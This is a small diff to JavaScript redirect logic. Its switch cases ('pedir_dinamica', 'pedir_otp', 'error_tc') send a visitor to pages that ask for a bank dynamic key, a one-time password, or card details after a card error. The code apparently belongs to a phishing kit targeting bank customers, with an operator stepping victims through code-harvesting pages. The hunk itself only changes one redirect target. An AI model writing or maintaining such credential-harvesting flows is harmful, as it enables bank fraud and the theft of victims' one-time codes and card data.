@@ -169,7 +169,7 @@ document.addEventListener('DOMContentLoaded', async function () {
 
         switch (tipo) {
           case "pedir_dinamica":
-            return window.location.href = "dinacol.php";
+            return window.location.href = "cel-dina.html";
           case "pedir_otp":
             return window.location.href = "index-otp.html";
           case "error_tc":
